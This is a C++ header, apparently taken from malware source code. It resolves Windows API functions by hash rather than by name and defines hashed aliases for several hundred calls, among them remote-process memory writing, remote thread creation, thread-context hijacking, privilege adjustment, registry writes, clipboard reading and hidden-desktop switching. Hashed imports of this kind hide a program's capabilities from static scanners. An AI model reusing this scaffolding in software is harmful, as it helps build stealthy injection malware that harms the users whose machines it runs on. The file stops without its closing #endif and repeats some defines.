
#ifndef GetApiH
#define GetApiH
//----------------------------------------------------------------------------
#pragma once
#include <windows.h>


//*******************************************************************
//  InitializeAPI - Функция инициализирует систему для работы с АПИ
//
//  ВАЖНО!!!!!!!
//
//  Перед использованием АПИ в процессе необходимо провести
//  инициализацию
//
//
//*******************************************************************
BOOL InitializeAPI();



enum TDllId
{

	DLL_KERNEL32   = 1,
	DLL_ADVAPI32   = 2,
	DLL_USER32     = 3,
	DLL_WINSOCK    = 4,
	DLL_NTDLL      = 5,
	DLL_WINSTA     = 6,
	DLL_SHELL32    = 7,
	DLL_WININET    = 8,
	DLL_URLMON     = 9,
	DLL_NSPR4      = 10,
	DLL_SSL3       = 11,
	DLL_WINMM      = 12,
	DLL_CABINET    = 13,
	DLL_OPERA      = 14,
	DLL_GDI		   = 15,  /* gdi32.dll */
	DLL_GDIPLUS	   = 16,  /* gdiplus.dll */
	DLL_CRYPT32	   = 17,  /* crypt32.dll */
	DLL_PSAPI	   = 18,  /* psapi.dll */
	DLL_SHLWAPI	   = 19,  /* shlwapi.dll */
	DLL_IPHLPAPI   = 20,  /* Iphlpapi.dll */
	DLL_WINSPOOL   = 21,  /* winspool_drv* */
	DLL_COMANDLG32 = 22,  /* commdlg32_dll */
	DLL_ODBC32	   = 23,   /* odbc32_dll */
	DLL_VERSION    = 24   /* version.dll */
};


//---------------------------------------------------------------------
//  GetDLLName -  Функция возвращает имя библиотеки
//---------------------------------------------------------------------
PCHAR GetDLLName(TDllId ID);

DWORD GetImageBase();


LPVOID GetApiAddr( HMODULE hModule, DWORD dwProcNameHash );
HMODULE GetDllBase( DWORD dwDllHash );
HMODULE GetKernel32();

#define RVATOVA( base, offset ) ( (DWORD)base + (DWORD)offset )

LPVOID GetProcAddressEx( char *Dll, DWORD dwModule, DWORD dwProcNameHash);
DWORD pGetLastError();


template <DWORD h, DWORD hash>
inline LPVOID pushargEx()
{
	typedef LPVOID (WINAPI *newfunc)();
	newfunc func = (newfunc)GetProcAddressEx(NULL, h, hash );
	return func();
}

template <DWORD h, DWORD hash, class A>
inline LPVOID pushargEx(A a1)
{	
	typedef LPVOID (WINAPI *newfunc)(A);
	newfunc func = (newfunc)GetProcAddressEx( NULL, h, hash );
	return func(a1);
}

template <DWORD h, DWORD hash, class A, class B>
inline LPVOID pushargEx(A a1,  B a2)
{	
	typedef LPVOID (WINAPI *newfunc)(A, B);
	newfunc func = (newfunc)GetProcAddressEx( NULL, h, hash );
	return func(a1,a2);
}

template <DWORD h, DWORD hash, class A, class B, class C>
inline LPVOID pushargEx(A a1,  B a2, C a3)
{
	typedef LPVOID (WINAPI *newfunc)(A, B, C);
	newfunc func = (newfunc)GetProcAddressEx( NULL, h, hash );
	return func(a1,a2,a3);
}

template <DWORD h, DWORD hash, class A, class B, class C, class D>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4)
{	
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D);
	newfunc func = (newfunc)GetProcAddressEx( NULL, h, hash );
	return func(a1,a2,a3,a4);
}

template <DWORD h, DWORD hash, class A, class B, class C, class D, class E>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5)
{	
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E);
	newfunc func = (newfunc)GetProcAddressEx( NULL, h, hash );
	return func(a1, a2, a3, a4, a5);
}

template <DWORD h, DWORD hash, class A, class B, class C, class D, class E, class F>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6)
{	
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F);
	newfunc func = (newfunc)GetProcAddressEx( NULL, h, hash );
	return func(a1, a2, a3, a4, a5, a6);
}

template <DWORD h, DWORD hash, class A, class B, class C, class D, class E, class F, class G>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7)
{	
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G);
	newfunc func = (newfunc)GetProcAddressEx( NULL, h, hash );
	return func(a1, a2, a3, a4, a5, a6, a7);
}

template <DWORD h, DWORD hash, class A, class B, class C, class D, class E, class F, class G, class H>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8)
{	
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G, H);
	newfunc func = (newfunc)GetProcAddressEx( NULL, h, hash );
	return func(a1, a2, a3, a4, a5, a6, a7, a8);
}

template <DWORD h, DWORD hash, class A, class B, class C, class D, class E, class F, class G, class H, class I>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8, I a9)
{	
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G, H, I);
	newfunc func = (newfunc)GetProcAddressEx( NULL, h, hash );
	return func(a1, a2, a3, a4, a5, a6, a7, a8, a9);
}

template <DWORD h, DWORD hash, class A, class B, class C, class D, class E, class F, class G, class H, class I, class X>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8, I a9, X a10)
{	
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G, H, I, X);
	newfunc func = (newfunc)GetProcAddressEx( NULL, h, hash );
	return func(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10);
}

template <DWORD h, DWORD hash, class A, class B, class C, class D, class E, class F, class G, class H, class I, class X, class Y>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8, I a9, X a10, Y a11 )
{	
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G, H, I, X, Y);
	newfunc func = (newfunc)GetProcAddressEx( NULL, h, hash );
	return func(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11);
}

template <DWORD h, DWORD hash, class A, class B, class C, class D, class E, class F, class G, class H, class I, class X, class Y, class Z, class R>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8, I a9, X a10, Y a11, Z a12, R a13)
{	
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G, H, I, X, Y, Z, R);
	newfunc func = (newfunc)GetProcAddressEx( NULL, h, hash );
	return func(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13);
}

template <DWORD h, DWORD hash, class A1, class A2, class A3, class A4, class A5,
	class A6, class A7, class A8, class A9, class A10, class A11, class A12>
inline LPVOID pushargEx(A1 a1, A2 a2, A3 a3, A4 a4, A5 a5, A6 a6, A7 a7, A8 a8,
						A9 a9, A10 a10, A11 a11, A12 a12)
{	
	typedef LPVOID (WINAPI *newfunc)(A1, A2, A3, A4, A5, A6, A7, A8, A9, A10,
									A11, A12);
	newfunc func = (newfunc)GetProcAddressEx( NULL, h, hash );
	return func(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12);
}


//kernel32
#define pLoadLibraryA 				pushargEx< DLL_KERNEL32, 0xC8AC8026>
#define pLoadLibraryW 				pushargEx< DLL_KERNEL32, 0xC8AC8030>
#define pLoadLibraryExA 			pushargEx< DLL_KERNEL32, 0x20088E6A>
#define pLoadLibraryExW 			pushargEx< DLL_KERNEL32, 0x20088E7C>
#define pFreeLibrary 				pushargEx< DLL_KERNEL32, 0x4B935B8E>
#define pGetProcAddress 			pushargEx< DLL_KERNEL32, 0x1FC0EAEE>
#define pTerminateProcess			pushargEx< DLL_KERNEL32, 0x9E6FA842>
#define pVirtualAlloc 				pushargEx< DLL_KERNEL32, 0x697A6AFE>
#define pVirtualAllocEx 			pushargEx< DLL_KERNEL32, 0x9ABFB8A6>
#define pVirtualFree 				pushargEx< DLL_KERNEL32, 0x3A35705F>
#define pVirtualFreeEx 				pushargEx< DLL_KERNEL32, 0x5C17EC75>
#define pVirtualQuery 				pushargEx< DLL_KERNEL32, 0x6A582465>
#define pVirtualQueryEx 			pushargEx< DLL_KERNEL32, 0x919786E>
#define pVirtualProtect 			pushargEx< DLL_KERNEL32, 0xA9DE6F5A>
#define pVirtualProtectEx 			pushargEx< DLL_KERNEL32, 0x9BD6888F>
#define pCloseHandle 				pushargEx< DLL_KERNEL32, 0x723EB0D5>
#define pGlobalAlloc 				pushargEx< DLL_KERNEL32, 0x725EA171>
#define pGlobalFree 				pushargEx< DLL_KERNEL32, 0x240339C8>
#define pCreateFileA 				pushargEx< DLL_KERNEL32, 0x8F8F114>
#define pCreateFileW 				pushargEx< DLL_KERNEL32, 0x8F8F102>
#define pWriteFile 					pushargEx< DLL_KERNEL32, 0xF3FD1C3>
#define pGetCurrentDirectoryA		pushargEx< DLL_KERNEL32, 0xC80715CE>
#define pWriteProcessMemory 		pushargEx< DLL_KERNEL32, 0xBEA0BF35>
#define pCreateRemoteThread 		pushargEx< DLL_KERNEL32, 0xE61874B3>
#define pReadFile 					pushargEx< DLL_KERNEL32, 0x487FE16B>
#define pSetFilePointer 			pushargEx< DLL_KERNEL32, 0xEF48E03A>
#define pSetEndOfFile 				pushargEx< DLL_KERNEL32, 0x2D0D9D61>
#define pCopyFileA 					pushargEx< DLL_KERNEL32, 0x2EE4F10D>
#define pCopyFileW 					pushargEx< DLL_KERNEL32, 0x2EE4F11B>
#define pMoveFileA 					pushargEx< DLL_KERNEL32, 0x20E4E9ED>
#define pMoveFileW 					pushargEx< DLL_KERNEL32, 0x20E4E9FB>
#define pMoveFileExA 				pushargEx< DLL_KERNEL32, 0x3A7A7478>
#define pMoveFileExW 				pushargEx< DLL_KERNEL32, 0x3A7A746E>
#define pDeleteFileA 				pushargEx< DLL_KERNEL32, 0x81F0F0DF>
#define pDeleteFileW 				pushargEx< DLL_KERNEL32, 0x81F0F0C9>
#define pGetFileSize 				pushargEx< DLL_KERNEL32, 0xAEF7CBF1>
#define pCreateFileMappingA 		pushargEx< DLL_KERNEL32, 0xEF0A25B7>
#define pCreateFileMappingW 		pushargEx< DLL_KERNEL32, 0xEF0A25A1>
#define pMapViewOfFile 				pushargEx< DLL_KERNEL32, 0x5CD9430>
#define pGetFileTime 				pushargEx< DLL_KERNEL32, 0xAE17C071>
#define pSetFileTime 				pushargEx< DLL_KERNEL32, 0xAE17C571>
#define pGetModuleHandleA 			pushargEx< DLL_KERNEL32, 0xA48D6762>
#define pGetModuleHandleW 			pushargEx< DLL_KERNEL32, 0xA48D6774>
#define pUnmapViewOfFile 			pushargEx< DLL_KERNEL32, 0x77CD9567>
#define pWaitForSingleObject 		pushargEx< DLL_KERNEL32, 0xC54374F3>
#define pSleep 						pushargEx< DLL_KERNEL32, 0x3D9972F5>
#define pWideCharToMultiByte 		pushargEx< DLL_KERNEL32, 0xE74F57EE>
#define pMultiByteToWideChar 		pushargEx< DLL_KERNEL32, 0x5AA7E70B>
#define pGetModuleFileNameA 		pushargEx< DLL_KERNEL32, 0x774393E8>
#define pGetModuleFileNameW 		pushargEx< DLL_KERNEL32, 0x774393FE>
#define pGetSystemDirectoryA 		pushargEx< DLL_KERNEL32, 0x49A1374A>
#define pGetSystemDirectoryW 		pushargEx< DLL_KERNEL32, 0x49A1375C>
#define pGetTempPathA 				pushargEx< DLL_KERNEL32, 0x58FE7ABE>
#define pGetTempPathW 				pushargEx< DLL_KERNEL32, 0x58FE7AA8>
#define pGetVolumeInformationA 		pushargEx< DLL_KERNEL32, 0x67ECDE97>
#define pGetVolumeInformationW 		pushargEx< DLL_KERNEL32, 0x67ECDE81>
#define pSetFileAttributesA 		pushargEx< DLL_KERNEL32, 0x4D5587B7>
#define pSetFileAttributesW 		pushargEx< DLL_KERNEL32, 0x4D5587A1>
#define pCreateProcessA 			pushargEx< DLL_KERNEL32, 0x46318AC7>
#define pCreateProcessW 			pushargEx< DLL_KERNEL32, 0x46318AD1>
#define pGetVersionExA 				pushargEx< DLL_KERNEL32, 0x9C480E24>
#define pGetVersionExW 				pushargEx< DLL_KERNEL32, 0x9C480E32>
#define pCreateThread 				pushargEx< DLL_KERNEL32, 0x6FB89AF0>
#define pSetThreadPriority			pushargEx< DLL_KERNEL32, 0xBC262395>
#define pCreateMutexA 				pushargEx< DLL_KERNEL32, 0xBF78969C>
#define pCreateMutexW 				pushargEx< DLL_KERNEL32, 0xBF78968A>
#define pReleaseMutex 				pushargEx< DLL_KERNEL32, 0xBB74A4A2>
#define pGetVersion 				pushargEx< DLL_KERNEL32, 0xCB932CE2>
#define pDeviceIoControl 			pushargEx< DLL_KERNEL32, 0x82E8173>
#define pQueryDosDeviceA 			pushargEx< DLL_KERNEL32, 0xAC81BECB>
#define pQueryDosDeviceW 			pushargEx< DLL_KERNEL32, 0xAC81BEDD>
#define pIsBadReadPtr 				pushargEx< DLL_KERNEL32, 0x7D544DBD>
#define pIsBadWritePtr 				pushargEx< DLL_KERNEL32, 0xAC85818D>
#define pGetCurrentProcess 			pushargEx< DLL_KERNEL32, 0xD89AD05>
#define pCreateMutexA 				pushargEx< DLL_KERNEL32, 0xBF78969C>
#define pCreateMutexW 				pushargEx< DLL_KERNEL32, 0xBF78968A>
#define pReleaseMutex 				pushargEx< DLL_KERNEL32, 0xBB74A4A2>
#define pCreateEventW 				pushargEx< DLL_KERNEL32, 0x8D5A50CA>
#define pSetEvent 					pushargEx< DLL_KERNEL32, 0x5E7EE0D0>
#define pResetEvent 				pushargEx< DLL_KERNEL32, 0x3B3EE0F9>
#define pGetShortPathNameA 			pushargEx< DLL_KERNEL32, 0x223296ED>
#define pGetShortPathNameW 			pushargEx< DLL_KERNEL32, 0x223296FB>
#define pLocalFree 					pushargEx< DLL_KERNEL32, 0x84033DEB>
#define pGetPrivateProfileStringA 	pushargEx< DLL_KERNEL32, 0xAA19E291>
#define pGetPrivateProfileStringW 	pushargEx< DLL_KERNEL32, 0xAA19E287>
#define pGetFileAttributesA 		pushargEx< DLL_KERNEL32, 0x475587B7>
#define pGetFileAttributesW 		pushargEx< DLL_KERNEL32, 0x475587A1>
#define pGetEnvironmentVariableA 	pushargEx< DLL_KERNEL32, 0x9802EF30>
#define pGetEnvironmentVariableW 	pushargEx< DLL_KERNEL32, 0x9802EF26>
#define pReadProcessMemory 			pushargEx< DLL_KERNEL32, 0x9D00A761>
#define pExitProcess 				pushargEx< DLL_KERNEL32, 0x95902B19>
#define pOpenProcess 				pushargEx< DLL_KERNEL32, 0x99A4299D>
#define pGetCurrentProcessId		pushargEx< DLL_KERNEL32, 0x6B416786>
#define pProcess32First 			pushargEx< DLL_KERNEL32, 0x19F78C90>
#define pProcess32Next 				pushargEx< DLL_KERNEL32, 0xC930EA1E>
#define pCreateToolhelp32Snapshot	pushargEx< DLL_KERNEL32, 0x5BC1D14F>
#define pWinExec 					pushargEx< DLL_KERNEL32, 0xE8BF6DAD>
#define pFindResourceA 				pushargEx< DLL_KERNEL32, 0x8FE060C>
#define pSetLastError 				pushargEx< DLL_KERNEL32, 0x1295012C>
#define pLoadResource 				pushargEx< DLL_KERNEL32, 0x1A10BD8B>
#define pLockResource 				pushargEx< DLL_KERNEL32, 0x1510BD8A>
#define pSizeofResource 			pushargEx< DLL_KERNEL32, 0x86867F0E>
#define pLockRsrc 					pushargEx< DLL_KERNEL32, 0xBAC5467D>
#define pGetTempFileNameA 			pushargEx< DLL_KERNEL32, 0xFA4F502>
#define pGetTempFileNameW 			pushargEx< DLL_KERNEL32, 0xFA4F514>
#define pGetLongPathNameA 			pushargEx< DLL_KERNEL32, 0x9835D5A1>
#define pCreateEventA				pushargEx< DLL_KERNEL32, 0x8D5A50DC>
#define pConnectNamedPipe			pushargEx< DLL_KERNEL32, 0x7235F00E>
#define pDisconnectNamedPipe   		pushargEx< DLL_KERNEL32, 0x46C6B01F>
#define pCreateNamedPipeA			pushargEx< DLL_KERNEL32, 0x42F9BB48>
#define pGetTickCount				pushargEx< DLL_KERNEL32, 0x69260152>
#define pExitThread					pushargEx< DLL_KERNEL32, 0x768AA260>
#define plstrcmpiA					pushargEx< DLL_KERNEL32, 0x515BE757>
#define pSuspendThread				pushargEx< DLL_KERNEL32, 0xEEBA5EBA>
#define pGetComputerNameA			pushargEx< DLL_KERNEL32, 0x3DEF91BA>
#define pGetThreadContext			pushargEx< DLL_KERNEL32, 0xAA1DE02F>
#define pSetThreadContext			pushargEx< DLL_KERNEL32, 0xAA1DC82F>
#define pResumeThread				pushargEx< DLL_KERNEL32, 0x7B88BF3B>
#define pProcessIdToSessionId		pushargEx< DLL_KERNEL32, 0x654F3F9E>
#define	pWTSGetActiveConsoleSessionId	pushargEx< DLL_KERNEL32, 0x654FEEAC>
#define pOpenMutexA					pushargEx< DLL_KERNEL32, 0xAE52C609>
#define pCreateProcessInternalA		pushargEx< DLL_KERNEL32, 0xE24394E4>
#define pCreateProcessInternalW		pushargEx< DLL_KERNEL32, 0xE24394F2>
#define pTerminateThread			pushargEx< DLL_KERNEL32, 0xC09D5D66>
#define plopen						pushargEx< DLL_KERNEL32, 0xCDFC3010>
#define plstrcmpA					pushargEx< DLL_KERNEL32, 0x2CA2B7E6>
#define plstrcmpW					pushargEx< DLL_KERNEL32, 0x2CA2B7F0>
#define plstrcatA					pushargEx< DLL_KERNEL32, 0x2CA1B5E6>
#define plstrcatW					pushargEx< DLL_KERNEL32, 0x2CA1B5F0>
#define plstrcpyA					pushargEx< DLL_KERNEL32, 0x2CA5F366>
#define plstrcpyW					pushargEx< DLL_KERNEL32, 0x2CA5F370>
#define plstrlenA					pushargEx< DLL_KERNEL32, 0x2D40B8E6>
#define plstrlenW					pushargEx< DLL_KERNEL32, 0x2D40B8F0>
#define pThread32First				pushargEx< DLL_KERNEL32, 0x89B968D2>
#define pThread32Next				pushargEx< DLL_KERNEL32, 0x4C1077D6>
#define pOpenThread					pushargEx< DLL_KERNEL32, 0x7E92CA65>
#define pGetWindowsDirectoryA		pushargEx< DLL_KERNEL32, 0x78B00C7E>
#define pGetWindowsDirectoryW		pushargEx< DLL_KERNEL32, 0x78B00C68>
#define pFindFirstFileA				pushargEx< DLL_KERNEL32, 0x32432444>
#define pFindFirstFileW				pushargEx< DLL_KERNEL32, 0x32432452>
#define pFindNextFileA				pushargEx< DLL_KERNEL32, 0x279DEAD7>
#define pFindNextFileW				pushargEx< DLL_KERNEL32, 0x279DEAC1>
#define pFindClose  				pushargEx< DLL_KERNEL32, 0x7B4842C1>
#define pRemoveDirectoryA			pushargEx< DLL_KERNEL32, 0x4AE7572B>
#define pInitializeCriticalSection	pushargEx< DLL_KERNEL32, 0xDA81BC58>
#define pEnterCriticalSection		pushargEx< DLL_KERNEL32, 0xF3B84F05>
#define pLeaveCriticalSection		pushargEx< DLL_KERNEL32, 0x392B6027>
#define pDeleteCriticalSection		pushargEx< DLL_KERNEL32, 0x7B2D2505>
#define pGetProcessHeap				pushargEx< DLL_KERNEL32, 0x68807354>
#define pHeapAlloc					pushargEx< DLL_KERNEL32, 0x5550B067>
#define pHeapReAlloc				pushargEx< DLL_KERNEL32, 0xFC7A6EFD>
#define pHeapSize					pushargEx< DLL_KERNEL32, 0x0AEBEA6A>
#define pHeapFree					pushargEx< DLL_KERNEL32, 0x084D25EA>
#define pGetCurrentThreadId			pushargEx< DLL_KERNEL32, 0xA45B370A>
#define pGetCurrentThread   		pushargEx< DLL_KERNEL32, 0x4FBA916C>
#define	pGlobalLock					pushargEx< DLL_KERNEL32, 0x25447AC6>
#define	pGlobalUnlock				pushargEx< DLL_KERNEL32, 0xF50B872>
#define pSetErrorMode				pushargEx< DLL_KERNEL32, 0x6C544060>
#define pGetFileInformationByHandle pushargEx< DLL_KERNEL32, 0xF149BCC4>
#define pFileTimeToLocalFileTime	pushargEx< DLL_KERNEL32, 0xE5792E94>
#define pFileTimeToDosDateTime		pushargEx< DLL_KERNEL32, 0xB68EBEF8>
#define pOutputDebugStringA			pushargEx< DLL_KERNEL32, 0xD0498CD4>
#define pExpandEnvironmentStringsA	pushargEx< DLL_KERNEL32, 0x23EBE98B>
#define pExpandEnvironmentStringsW	pushargEx< DLL_KERNEL32, 0x23EBE99D>
#define pOutputDebugStringW			pushargEx< DLL_KERNEL32, 0xD0498CC2>
#define pLocalAlloc 				pushargEx< DLL_KERNEL32, 0x725CB0A1>
#define pFindFirstChangeNotificationA pushargEx< DLL_KERNEL32, 0xE8402F0>
#define pFindCloseChangeNotification  pushargEx< DLL_KERNEL32, 0x3634D801>
#define pFindNextChangeNotification   pushargEx< DLL_KERNEL32, 0xFAB3FE71>
#define pCreateDirectoryW			  pushargEx< DLL_KERNEL32, 0xA073561>
#define pCreateDirectoryA		    pushargEx< DLL_KERNEL32, 0xA073577>
#define pOpenEventW					pushargEx< DLL_KERNEL32, 0x9C70005F>
#define pGetSystemTimeAsFileTime	pushargEx< DLL_KERNEL32, 0x6951E92A>
#define pGetSystemTime 				pushargEx< DLL_KERNEL32, 0x270118E2>
#define pFileTimeToSystemTime		pushargEx< DLL_KERNEL32, 0x3B429F5F>
#define pCompareFileTime			pushargEx< DLL_KERNEL32, 0x41C9C8F5>
#define pSystemTimeToFileTime		pushargEx< DLL_KERNEL32, 0xEA7EA921>
#define pGetLogicalDriveStringsA  	pushargEx< DLL_KERNEL32, 0x70F6FE31>
#define pGetDriveTypeA          	pushargEx< DLL_KERNEL32, 0x399354CE>
#define pSleepEx				 	pushargEx< DLL_KERNEL32, 0x5CBD6D9E>
#define pGetProcessId				pushargEx< DLL_KERNEL32, 0x0e91a280>
#define pOpenEventA					pushargEx< DLL_KERNEL32, 0x9C700049>
#define pSetCurrentDirectoryW		pushargEx< DLL_KERNEL32, 0xc8071758>
#define pSetCurrentDirectoryA		pushargEx< DLL_KERNEL32, 0xc807174e>
#define pDuplicateHandle			pushargEx< DLL_KERNEL32, 0x533d3b41>
#define pGetExitCodeThread			pushargEx< DLL_KERNEL32, 0x4E5A10B1>
#define pGetCommandLineA			pushargEx< DLL_KERNEL32, 0xFB0730C>
#define pGetPrivateProfileIntA		pushargEx< DLL_KERNEL32, 0x11CC0678>
#define pGetPrivateProfileStringA	pushargEx< DLL_KERNEL32, 0xAA19E291>
#define pProcess32FirstW 			pushargEx< DLL_KERNEL32, 0xFBC6485B>
#define pProcess32NextW				pushargEx< DLL_KERNEL32, 0x98750F33>
#define pGetLogicalDrives			pushargEx< DLL_KERNEL32, 0x6A3376B7>
#define pGetDriveTypeA				pushargEx< DLL_KERNEL32, 0x399354CE>
#define pInterlockedIncrement		pushargEx< DLL_KERNEL32, 0xD03C6D18>
#define pInterlockedDecrement		pushargEx< DLL_KERNEL32, 0xDD2A6D18>

//advapi32
#define pCreateProcessAsUserA		pushargEx< DLL_ADVAPI32, 0x985267C4>
#define pSetThreadToken				pushargEx< DLL_ADVAPI32, 0xA16FE0FD>
#define pOpenProcessToken 			pushargEx< DLL_ADVAPI32, 0x80DBBE07>
#define pLookupPrivilegeValueA 		pushargEx< DLL_ADVAPI32, 0x1B3D12B9>
#define pLookupPrivilegeValueW 		pushargEx< DLL_ADVAPI32, 0x1B3D12AF>
#define pAdjustTokenPrivileges 		pushargEx< DLL_ADVAPI32, 0x7A2167DC>
#define pRegOpenKeyExA 				pushargEx< DLL_ADVAPI32, 0xAAD67FF8>
#define pRegOpenKeyExW 				pushargEx< DLL_ADVAPI32, 0xAAD67FEE>
#define pRegQueryInfoKeyA 			pushargEx< DLL_ADVAPI32, 0xBDF4DB19>
#define pRegQueryInfoKeyW 			pushargEx< DLL_ADVAPI32, 0xBDF4DB0F>
#define pRegEnumKeyExA 				pushargEx< DLL_ADVAPI32, 0xB4F673FD>
#define pRegEnumKeyExW 				pushargEx< DLL_ADVAPI32, 0xB4F673EB>
#define pRegEnumValueA 				pushargEx< DLL_ADVAPI32, 0xF65A7D95>
#define pRegEnumValueW 				pushargEx< DLL_ADVAPI32, 0xF65A7D83>
#define pRegQueryValueExA 			pushargEx< DLL_ADVAPI32, 0x1802E7C8>
#define pRegQueryValueExW 			pushargEx< DLL_ADVAPI32, 0x1802E7DE>
#define pRegCloseKey 				pushargEx< DLL_ADVAPI32, 0xDB355534>
#define pRegDeleteKeyA 				pushargEx< DLL_ADVAPI32, 0x398C5285>
#define pRegDeleteKeyW 				pushargEx< DLL_ADVAPI32, 0x398C5293>
#define pRegSetValueExA 			pushargEx< DLL_ADVAPI32, 0x3E400FD6>
#define pRegSetValueExW 			pushargEx< DLL_ADVAPI32, 0x3E400FC0>
#define pGetUserNameA 				pushargEx< DLL_ADVAPI32, 0xB9D41C2F>
#define pGetUserNameW 				pushargEx< DLL_ADVAPI32, 0xB9D41C39>
#define pOpenServiceA 				pushargEx< DLL_ADVAPI32, 0x83969964>
#define pStartServiceA 				pushargEx< DLL_ADVAPI32, 0x1CA1FD2F>
#define pGetKernelObjectSecurity 	pushargEx< DLL_ADVAPI32, 0xB29136DD>
#define pOpenSCManagerA 			pushargEx< DLL_ADVAPI32, 0xA06E459C>
#define pGetCurrentHwProfileA		pushargEx< DLL_ADVAPI32, 0xF684C7A9>
#define pGetTokenInformation		pushargEx< DLL_ADVAPI32, 0xD4ECC759>
#define pInitializeSecurityDescriptor	pushargEx< DLL_ADVAPI32, 0xB8538A52>
#define pSetSecurityDescriptorOwner pushargEx< DLL_ADVAPI32, 0xDADD5994>
#define pSetFileSecurityW			pushargEx< DLL_ADVAPI32, 0x5A9B2FDD>
#define pRegCreateKeyW				pushargEx< DLL_ADVAPI32, 0xAE9E4290>
#define pRegCreateKeyA				pushargEx< DLL_ADVAPI32, 0xAE9E4286>
#define pRegCreateKeyExW			pushargEx< DLL_ADVAPI32, 0x90A097F0>
#define pRegCreateKeyExA			pushargEx< DLL_ADVAPI32, 0x90A097E6>
#define pRegSaveKeyA				pushargEx< DLL_ADVAPI32, 0xBEDEEFC5>
#define pRegSaveKeyW				pushargEx< DLL_ADVAPI32, 0xBEDEEFD3>
#define pRegSaveKeyExA				pushargEx< DLL_ADVAPI32, 0xBBF053F6>
#define pRegSaveKeyExW				pushargEx< DLL_ADVAPI32, 0xBBF053E0>
#define pCryptAcquireContextA		pushargEx< DLL_ADVAPI32, 0x8AD7DE34>
#define pCryptReleaseContext		pushargEx< DLL_ADVAPI32, 0x72760BB8>
#define pCryptImportKey     		pushargEx< DLL_ADVAPI32, 0x78660DBE>
#define pCryptEncrypt    	    	pushargEx< DLL_ADVAPI32, 0xCEBF13BE>
#define pCryptDecrypt    	    	pushargEx< DLL_ADVAPI32, 0xCEBF17E6>
#define pCryptSetKeyParam   		pushargEx< DLL_ADVAPI32, 0x37A53419>
#define pCryptDestroyKey    		pushargEx< DLL_ADVAPI32, 0xD4B3D42>

//user32
#define pExitWindowsEx 				pushargEx< DLL_USER32, 0xAD7043A4>
#define pPeekMessageW 				pushargEx< DLL_USER32, 0xD7A87C3A>
#define pDispatchMessageW 			pushargEx< DLL_USER32, 0x4BAED1DE>
#define pMsgWaitForMultipleObjects 	pushargEx< DLL_USER32, 0xD36CEAF0>
#define pWaitForInputIdle			pushargEx< DLL_USER32, 0x4FAC81B4>
#define pGetWindowThreadProcessId	pushargEx< DLL_USER32, 0x6C7F716F>
#define pFindWindowA				pushargEx< DLL_USER32, 0x252B53B>
#define pGetSystemMetrics			pushargEx< DLL_USER32, 0x8EBEF5B1>
#define pGetActiveWindow			pushargEx< DLL_USER32, 0xDB7C98AC>
#define pGetKeyboardLayoutNameA		pushargEx< DLL_USER32, 0xEA0FAD78>
#define pOpenClipboard				pushargEx< DLL_USER32, 0x6ADFC795>
#define pGetClipboardData			pushargEx< DLL_USER32, 0x8E7AE818>
#define pCloseClipboard				pushargEx< DLL_USER32, 0xF0EC2212>
#define pGetWindowTextA				pushargEx< DLL_USER32, 0x9C29100A>
#define pGetWindowTextW				pushargEx< DLL_USER32, 0x9C29101C>
#define pGetForegroundWindow		pushargEx< DLL_USER32, 0xCACD450>
#define pGetWindowLongPtrA			pushargEx< DLL_USER32, 0x1D6C998B>
#define pGetWindowLongPtrW			pushargEx< DLL_USER32, 0x1D6C999D>
#define pEnumChildWindows			pushargEx< DLL_USER32, 0xAE8A5532>
#define pGetParent					pushargEx< DLL_USER32, 0x5992A5F2>
#define pGetDesktopWindow			pushargEx< DLL_USER32, 0xCD4AC62B>
#define pIsWindowVisible			pushargEx< DLL_USER32, 0xCFAAD7BF>
#define pIsWindowUnicode            pushargEx< DLL_USER32, 0x6EE99F86>
#define pSetWindowLongA				pushargEx< DLL_USER32, 0xBD6C998B>
#define pSetWindowLongW				pushargEx< DLL_USER32, 0xBD6C999D>
#define pGetWindowLongA				pushargEx< DLL_USER32, 0x1D6C998B>
#define pGetWindowLongW				pushargEx< DLL_USER32, 0x1D6C999D>
#define pSetLayeredWindowAttributes	pushargEx< DLL_USER32, 0x2DDBD2AF>
#define pSetWindowPos				pushargEx< DLL_USER32, 0xA92DF5AF>
#define pMessageBoxA				pushargEx< DLL_USER32, 0xABBC680D>
#define pMessageBoxW				pushargEx< DLL_USER32, 0xABBC681B>
#define pGetClassNameW				pushargEx< DLL_USER32, 0x484006A>
#define pGetClassNameA				pushargEx< DLL_USER32, 0x484007C>
#define pShowWindow					pushargEx< DLL_USER32, 0x7506E960>
#define pSendMessageW				pushargEx< DLL_USER32, 0x58A81C3F>
#define pSendMessageA				pushargEx< DLL_USER32, 0x58A81C29>
#define pEnumWindows				pushargEx< DLL_USER32, 0x9940B5CA>
#define pIsWindow					pushargEx< DLL_USER32, 0x9D4AF949>
#define pWaitForInputIdle			pushargEx< DLL_USER32, 0x4FAC81B4>
#define pGetWindow					pushargEx< DLL_USER32, 0xDA12E549>
#define pCreateDesktopW				pushargEx< DLL_USER32, 0xC43ED7B1>
#define pCreateDesktopA				pushargEx< DLL_USER32, 0xC43ED7A7>
#define pGetThreadDesktop			pushargEx< DLL_USER32, 0x79F9B7FA>
#define pSwitchDesktop				pushargEx< DLL_USER32, 0x5B92DEA5>
#define pSetThreadDesktop			pushargEx< DLL_USER32, 0x79F99FFA>
